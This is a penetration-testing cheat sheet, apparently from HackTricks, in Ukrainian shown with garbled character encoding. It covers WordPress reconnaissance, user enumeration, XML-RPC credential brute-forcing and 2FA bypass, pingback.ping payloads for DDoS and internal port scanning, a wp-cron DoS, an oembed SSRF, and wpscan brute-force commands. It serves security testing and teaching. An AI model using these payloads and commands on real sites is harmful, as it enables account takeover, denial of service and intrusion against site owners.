# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## –ë–∞–∑–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

- **–ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ** —Ñ–∞–π–ª–∏ –ø–æ—Ç—Ä–∞–ø–ª—è—é—Ç—å —É: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **–§–∞–π–ª–∏ —Ç–µ–º –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ /wp-content/themes/,** —Ç–æ–∂ —è–∫—â–æ –≤–∏ –∑–º—ñ–Ω–∏—Ç–µ —è–∫–∏–π—Å—å php —Ñ–∞–π–ª—É —Ç–µ–º–∏, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE, –π–º–æ–≤—ñ—Ä–Ω–æ –≤–∏ –±—É–¥–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ–π —à–ª—è—Ö. –ù–∞–ø—Ä–∏–∫–ª–∞–¥: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **theme twentytwelve** –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ñ–∞–π–ª—É **404.php** –∑–∞ –∞–¥—Ä–µ—Å–æ—é: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- –£ **wp-config.php** –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ root-–ø–∞—Ä–æ–ª—å –±–∞–∑–∏ –¥–∞–Ω–∏—Ö.
- –¢–∏–ø–æ–≤—ñ —à–ª—è—Ö–∏ –¥–ª—è –≤—Ö–æ–¥—É, —è–∫—ñ –≤–∞—Ä—Ç–æ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` –º—ñ—Å—Ç–∏—Ç—å –∫–æ—Ä–∏—Å–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, —Ç–∞–∫—É —è–∫ –≤–µ—Ä—Å—ñ—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ–≥–æ WordPress.
- `wp-activate.php` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø—Ä–æ—Ü–µ—Å—É –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ email –ø—Ä–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—ñ –Ω–æ–≤–æ–≥–æ —Å–∞–π—Ç—É WordPress.
- –ü–∞–ø–∫–∏ –¥–ª—è –≤—Ö–æ–¥—É (–º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø–µ—Ä–µ–π–º–µ–Ω–æ–≤–∞–Ω—ñ, —â–æ–± –ø—Ä–∏—Ö–æ–≤–∞—Ç–∏):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ‚Äî —Ü–µ —Ñ–∞–π–ª, —è–∫–∏–π —Ä–µ–∞–ª—ñ–∑—É—î —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å WordPress –¥–ª—è –ø–µ—Ä–µ–¥–∞–≤–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö —á–µ—Ä–µ–∑ HTTP —è–∫ —Ç—Ä–∞–Ω—Å–ø–æ—Ä—Ç —Ç–∞ XML —è–∫ –º–µ—Ö–∞–Ω—ñ–∑–º –∫–æ–¥—É–≤–∞–Ω–Ω—è. –¢–∞–∫–∏–π —Ç–∏–ø –≤–∑–∞—î–º–æ–¥—ñ—ó –±—É–ª–æ –∑–∞–º—ñ–Ω–µ–Ω–æ WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- –ü–∞–ø–∫–∞ `wp-content` ‚Äî –æ—Å–Ω–æ–≤–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –ø–ª–∞–≥—ñ–Ω–∏ —Ç–∞ —Ç–µ–º–∏.
- `wp-content/uploads/` ‚Äî –∫–∞—Ç–∞–ª–æ–≥, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤—Å—ñ —Ñ–∞–π–ª–∏, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –Ω–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º—É.
- `wp-includes/` ‚Äî –∫–∞—Ç–∞–ª–æ–≥, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è core-—Ñ–∞–π–ª–∏, —Ç–∞–∫—ñ —è–∫ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏, —à—Ä–∏—Ñ—Ç–∏, —Ñ–∞–π–ª–∏ JavaScript —Ç–∞ –≤—ñ–¥–∂–µ—Ç–∏.
- `wp-sitemap.xml` –£ –≤–µ—Ä—Å—ñ—è—Ö WordPress 5.5 —ñ –≤–∏—â–µ WordPress –≥–µ–Ω–µ—Ä—É—î sitemap XML –∑ —É—Å—ñ–º–∞ –ø—É–±–ª—ñ—á–Ω–∏–º–∏ –∑–∞–ø–∏—Å–∞–º–∏ —Ç–∞ –ø—É–±–ª—ñ—á–Ω–æ –∑–∞–ø–∏—Ç—É–≤–∞–Ω–∏–º–∏ —Ç–∏–ø–∞–º–∏ –∑–∞–ø–∏—Å—ñ–≤ —ñ —Ç–∞–∫—Å–æ–Ω–æ–º—ñ—è–º–∏.

**–ü–æ—Å—Ç-–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è**

- –§–∞–π–ª `wp-config.php` –º—ñ—Å—Ç–∏—Ç—å —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –Ω–µ–æ–±—Ö—ñ–¥–Ω—É WordPress –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —Ç–∞–∫—É —è–∫ –Ω–∞–∑–≤–∞ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —Ö–æ—Å—Ç –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —ñ –ø–∞—Ä–æ–ª—å, authentication keys —ñ salts, –∞ —Ç–∞–∫–æ–∂ –ø—Ä–µ—Ñ—ñ–∫—Å —Ç–∞–±–ª–∏—Ü—å –±–∞–∑–∏ –¥–∞–Ω–∏—Ö. –¶–µ–π –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–π —Ñ–∞–π–ª —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó DEBUG-—Ä–µ–∂–∏–º—É, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º –ø—Ä–∏ —É—Å—É–Ω–µ–Ω–Ω—ñ –Ω–µ—Å–ø—Ä–∞–≤–Ω–æ—Å—Ç–µ–π.

### –î–æ–∑–≤–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤

- **–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä**
- **–†–µ–¥–∞–∫—Ç–æ—Ä**: –ü—É–±–ª—ñ–∫—É—î —Ç–∞ –∫–µ—Ä—É—î —Å–≤–æ—ó–º–∏ –π —á—É–∂–∏–º–∏ –∑–∞–ø–∏—Å–∞–º–∏
- **–ê–≤—Ç–æ—Ä**: –ü—É–±–ª—ñ–∫—É—î —Ç–∞ –∫–µ—Ä—É—î –≤–ª–∞—Å–Ω–∏–º–∏ –∑–∞–ø–∏—Å–∞–º–∏
- **–î–æ–ø–∏—Å—É–≤–∞—á**: –ü–∏—à–µ —ñ –∫–µ—Ä—É—î —Å–≤–æ—ó–º–∏ –∑–∞–ø–∏—Å–∞–º–∏, –∞–ª–µ –Ω–µ –º–æ–∂–µ —ó—Ö –ø—É–±–ª—ñ–∫—É–≤–∞—Ç–∏
- **–ü—ñ–¥–ø–∏—Å–Ω–∏–∫**: –ü–µ—Ä–µ–≥–ª—è–¥–∞—î –ø–æ—Å—Ç–∏ —Ç–∞ —Ä–µ–¥–∞–≥—É—î —Å–≤—ñ–π –ø—Ä–æ—Ñ—ñ–ª—å

## **–ü–∞—Å–∏–≤–Ω–∞ –µ–Ω—É–º–µ—Ä–∞—Ü—ñ—è**

### **–û—Ç—Ä–∏–º–∞—Ç–∏ –≤–µ—Ä—Å—ñ—é WordPress**

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —Ñ–∞–π–ª–∏ `/license.txt` –∞–±–æ `/readme.html`

–£ **–∫–æ–¥—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏** (–ø—Ä–∏–∫–ª–∞–¥ –∑ [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link —Ñ–∞–π–ª–∏

![](<../../images/image (533).png>)

- JavaScript —Ñ–∞–π–ª–∏

![](<../../images/image (524).png>)

### –û—Ç—Ä–∏–º–∞—Ç–∏ –ø–ª–∞–≥—ñ–Ω–∏
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### –û—Ç—Ä–∏–º–∞—Ç–∏ —Ç–µ–º–∏
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### –û—Ç—Ä–∏–º–∞–Ω–Ω—è –≤–µ—Ä—Å—ñ–π –∑–∞–≥–∞–ª–æ–º
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Active enumeration

### Plugins and Themes

–ô–º–æ–≤—ñ—Ä–Ω–æ, –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –≤—Å—ñ –º–æ–∂–ª–∏–≤—ñ Plugins —ñ Themes. –©–æ–± –≤–∏—è–≤–∏—Ç–∏ —ó—Ö —É—Å—ñ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ **actively Brute Force a list of Plugins and Themes** (–Ω–∞ —â–∞—Å—Ç—è –¥–ª—è –Ω–∞—Å, —ñ—Å–Ω—É—é—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —è–∫—ñ –º—ñ—Å—Ç—è—Ç—å —Ü—ñ —Å–ø–∏—Å–∫–∏).

### –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ

- **ID Brute:** –í–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ –≤–∞–ª—ñ–¥–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ —Å–∞–π—Ç—É WordPress —à–ª—è—Ö–æ–º Brute Forcing user IDs:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
–Ø–∫—â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ ‚Äî **200** –∞–±–æ **30X**, —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ id —î **–¥—ñ–π—Å–Ω–∏–º**. –Ø–∫—â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å ‚Äî **400**, —Ç–æ id —î **–Ω–µ–¥—ñ–π—Å–Ω–∏–º**.

- **wp-json:** –¢–∞–∫–æ–∂ –º–æ–∂–Ω–∞ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –≤–∏–∫–æ–Ω—É—é—á–∏ –∑–∞–ø–∏—Ç:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
–©–µ –æ–¥–∏–Ω –µ–Ω–¥–ø–æ—ó–Ω—Ç `/wp-json/`, —è–∫–∏–π –º–æ–∂–µ —Ä–æ–∑–∫—Ä–∏—Ç–∏ –¥–µ—è–∫—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —Ü–µ:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü—è –∫—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞ –ø–æ–≤–µ—Ä—Ç–∞—î –ª–∏—à–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —è–∫—ñ –æ–ø—É–±–ª—ñ–∫—É–≤–∞–ª–∏ –ø–æ—Å—Ç. **–Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –Ω–∞–¥–∞—î—Ç—å—Å—è –ª–∏—à–µ –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —É —è–∫–∏—Ö —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è —É–≤—ñ–º–∫–Ω–µ–Ω–∞**.

–¢–∞–∫–æ–∂ –∑–∞—É–≤–∞–∂—Ç–µ, —â–æ **/wp-json/wp/v2/pages** –º–æ–∂–µ leak IP-–∞–¥—Ä–µ—Å–∏.

- **Login username enumeration**: –ü—ñ–¥ —á–∞—Å –≤—Ö–æ–¥—É —á–µ—Ä–µ–∑ **`/wp-login.php`** **–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è** —î **—Ä—ñ–∑–Ω–∏–º** ‚Äî –≤–æ–Ω–æ –≤–∫–∞–∑—É—î, —á–∏ —ñ—Å–Ω—É—î –∑–∞–∑–Ω–∞—á–µ–Ω–∏–π **username** —á–∏ –Ω—ñ.

### XML-RPC

–Ø–∫—â–æ `xml-rpc.php` –∞–∫—Ç–∏–≤–Ω–∏–π, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ credentials brute-force –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è –∑–∞–ø—É—Å–∫—É DoS –∞—Ç–∞–∫ –Ω–∞ —ñ–Ω—à—ñ —Ä–µ—Å—É—Ä—Å–∏. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

–©–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –∞–∫—Ç–∏–≤–Ω–∏–π, —Å–ø—Ä–æ–±—É–π—Ç–µ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ _**/xmlrpc.php**_ —ñ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ —Ü–µ–π –∑–∞–ø–∏—Ç:

**–ü–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**–û–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** –∞–±–æ **`metaWeblog.getUsersBlogs`** ‚Äî —Ü–µ –¥–µ—è–∫—ñ –º–µ—Ç–æ–¥–∏, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –¥–ª—è brute-force –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö. –Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –±—É–¥—å-—è–∫–∏–π –∑ –Ω–∏—Ö, –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ —â–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
–ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è _"Incorrect username or password"_ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑ –∫–æ–¥–æ–º 200 –ø–æ–≤–∏–Ω–Ω–æ –∑'—è–≤–ª—è—Ç–∏—Å—è, —è–∫—â–æ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –Ω–µ–¥—ñ–π—Å–Ω—ñ.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø—Ä–∞–≤–∏–ª—å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª. –£ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑'—è–≤–∏—Ç—å—Å—è —à–ª—è—Ö ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
–¢–∞–∫–æ–∂ —î **—à–≤–∏–¥—à–∏–π —Å–ø–æ—Å—ñ–±** –ø–µ—Ä–µ–±–æ—Ä—É –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **`system.multicall`**, –æ—Å–∫—ñ–ª—å–∫–∏ –º–æ–∂–Ω–∞ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∫—ñ–ª—å–∫–∞ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –≤ –æ–¥–Ω–æ–º—É –∑–∞–ø–∏—Ç—ñ:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

–¶–µ–π –º–µ—Ç–æ–¥ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –ø—Ä–æ–≥—Ä–∞–º, –∞ –Ω–µ –¥–ª—è –ª—é–¥–µ–π, —ñ —î –∑–∞—Å—Ç–∞—Ä—ñ–ª–∏–º, —Ç–æ–º—É –Ω–µ –ø—ñ–¥—Ç—Ä–∏–º—É—î 2FA. –û—Ç–∂–µ, —è–∫—â–æ —É –≤–∞—Å —î –≤–∞–ª—ñ–¥–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –∞–ª–µ –æ—Å–Ω–æ–≤–Ω–∏–π –≤—Ö—ñ–¥ –∑–∞—Ö–∏—â–µ–Ω–∏–π 2FA, **–≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ xmlrpc.php –¥–ª—è –≤—Ö–æ–¥—É –∑ —Ü–∏–º–∏ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –¥–∞–Ω–∏–º–∏, –æ–º–∏–Ω–∞—é—á–∏ 2FA**. –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –≤—Å—ñ –¥—ñ—ó, —è–∫—ñ –¥–æ—Å—Ç—É–ø–Ω—ñ —á–µ—Ä–µ–∑ –∫–æ–Ω—Å–æ–ª—å, –∞–ª–µ –≤—Å–µ —â–µ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE, —è–∫ –ø–æ—è—Å–Ω—é—î Ippsec —É [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –º–µ—Ç–æ–¥ _**pingback.ping**_ —É —Å–ø–∏—Å–∫—É, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ Wordpress –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∑–∞–ø–∏—Ç –Ω–∞ –±—É–¥—å-—è–∫–∏–π —Ö–æ—Å—Ç/–ø–æ—Ä—Ç.\
–¶–µ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏, —â–æ–± –ø–æ–ø—Ä–æ—Å–∏—Ç–∏ **—Ç–∏—Å—è—á—ñ** Wordpress **—Å–∞–π—Ç—ñ–≤** –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ –æ–¥–Ω—ñ—î—ó **–ª–æ–∫–∞—Ü—ñ—ó** (–≤–Ω–∞—Å–ª—ñ–¥–æ–∫ —á–æ–≥–æ —Ç–∞–º –≤–∏–Ω–∏–∫–Ω–µ **DDoS**) –∞–±–æ –∑–∞—Å—Ç–æ—Å—É–≤–∞—Ç–∏ —Ü–µ, —â–æ–± –∑–º—É—Å–∏—Ç–∏ **Wordpress** —Å–∫–∞–Ω—É–≤–∞—Ç–∏ –≤–Ω—É—Ç—Ä—ñ—à–Ω—é **–º–µ—Ä–µ–∂—É** (–º–æ–∂–Ω–∞ –≤–∫–∞–∑–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π –ø–æ—Ä—Ç).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

–Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ **faultCode** –∑—ñ –∑–Ω–∞—á–µ–Ω–Ω—è–º **–±—ñ–ª—å—à–∏–º** –∑–∞ **0** (17), —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –ø–æ—Ä—Ç –≤—ñ–¥–∫—Ä–∏—Ç–∏–π.

–ü–æ–≥–ª—è–Ω—å—Ç–µ –Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **`system.multicall`** –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º –º–µ—Ç–æ–¥–æ–º –¥–ª—è —Å–ø—Ä–∏—á–∏–Ω–µ–Ω–Ω—è DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

–¶–µ–π —Ñ–∞–π–ª –∑–∞–∑–≤–∏—á–∞–π –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –∫–æ—Ä–µ–Ω—ñ —Å–∞–π—Ç—É Wordpress: **`/wp-cron.php`**\
–ü—Ä–∏ –∑–≤–µ—Ä–Ω–µ–Ω–Ω—ñ –¥–æ —Ü—å–æ–≥–æ —Ñ–∞–π–ª—É –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è **–≤–∞–∂–∫–∏–π** MySQL **–∑–∞–ø–∏—Ç**, —Ç–æ–º—É –≤—ñ–Ω –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º–∏ –¥–ª—è —Å–ø—Ä–∏—á–∏–Ω–µ–Ω–Ω—è **DoS**.\
–î–æ —Ç–æ–≥–æ –∂, –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, `wp-cron.php` –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –ø—Ä–∏ –∫–æ–∂–Ω–æ–º—É –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ (–∫–æ–ª–∏ –∫–ª—ñ—î–Ω—Ç –∑–∞–ø–∏—Ç—É—î –±—É–¥—å-—è–∫—É —Å—Ç–æ—Ä—ñ–Ω–∫—É Wordpress), —â–æ –Ω–∞ —Å–∞–π—Ç–∞—Ö –∑ –≤–∏—Å–æ–∫–∏–º —Ç—Ä–∞—Ñ—ñ–∫–æ–º –º–æ–∂–µ —Å–ø—Ä–∏—á–∏–Ω–∏—Ç–∏ –ø—Ä–æ–±–ª–µ–º–∏ (DoS).

–†–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤—ñ–¥–∫–ª—é—á–∏—Ç–∏ Wp-Cron —ñ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ä–µ–∞–ª—å–Ω–∏–π cronjob –Ω–∞ —Ö–æ—Å—Ç—ñ, —è–∫–∏–π –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏–º–µ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥—ñ—ó —á–µ—Ä–µ–∑ —Ä–µ–≥—É–ª—è—Ä–Ω—ñ —ñ–Ω—Ç–µ—Ä–≤–∞–ª–∏ (–±–µ–∑ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø—Ä–æ–±–ª–µ–º).

### /wp-json/oembed/1.0/proxy - SSRF

–°–ø—Ä–æ–±—É–π—Ç–µ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ —ñ —Å–∞–π—Ç Wordpress –º–æ–∂–µ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞–ø–∏—Ç –¥–æ –≤–∞—Å.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

–¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ —ñ—Å–Ω—É—î **methodName: pingback.ping** —ñ —à–ª—è—Ö **/wp-json/oembed/1.0/proxy**, —ñ —è–∫—â–æ –≤–æ–Ω–∏ —ñ—Å–Ω—É—é—Ç—å, –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è —ó—Ö –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏.

## –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
